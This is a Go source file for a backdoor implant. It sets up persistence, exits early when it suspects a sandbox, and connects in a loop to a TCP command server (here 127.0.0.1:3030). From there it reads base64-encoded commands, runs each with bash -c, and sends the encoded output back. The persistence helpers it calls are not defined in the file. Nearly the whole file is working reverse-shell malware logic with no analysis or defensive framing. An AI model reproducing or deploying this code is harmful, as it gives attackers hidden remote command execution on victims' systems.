package main

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"net"
	"os"
	"os/exec"
	"time"
)

const HAS_PERSISTED = "NOT_PERSISTED"
const SLEEP_TIME = 5 * time.Second

func main() {
	// Check if the program has already persisted
	if HAS_PERSISTED != "HAS_PERSISTED" {
		if HAS_PERSISTED != "HAS_PERSISTED" && !HasPersisted() {
			// Exit since we persisted, but not in the right directory
			// Since it might be an indication of a sandbox
			os.Exit(0)
		}
		if err := Persist(); err != nil {
			fmt.Println("failed to persist:", err)
		}
	}

	var conn net.Conn
	var err error
	for {
		if conn == nil {
			conn, err = net.Dial("tcp", "127.0.0.1:3030")
			if err != nil {
				fmt.Println(err)
				time.Sleep(SLEEP_TIME)
				continue
			}
		}
		encodedCmd, err := bufio.NewReader(conn).ReadString('\n')
		if err != nil {
			fmt.Println(err)
			conn.Close()
			conn = nil
			time.Sleep(SLEEP_TIME)
			continue
		}

		decodedCmd, err := base64.StdEncoding.DecodeString(encodedCmd[:len(encodedCmd)-1])
		if err != nil {
			fmt.Println(err)
			conn.Close()
			conn = nil
			time.Sleep(SLEEP_TIME)
			continue
		}

		cmd := exec.Command("bash", "-c", string(decodedCmd))
		output, err := cmd.Output()
		if err != nil {
			fmt.Println(err)
			conn.Close()
			conn = nil
			time.Sleep(SLEEP_TIME)
			continue
		}

		encodedOutput := base64.StdEncoding.EncodeToString(output)
		_, err = conn.Write([]byte(encodedOutput + "\n"))
		if err != nil {
			fmt.Println(err)
			conn.Close()
			conn = nil
			time.Sleep(SLEEP_TIME)
			continue
		}
	}
}
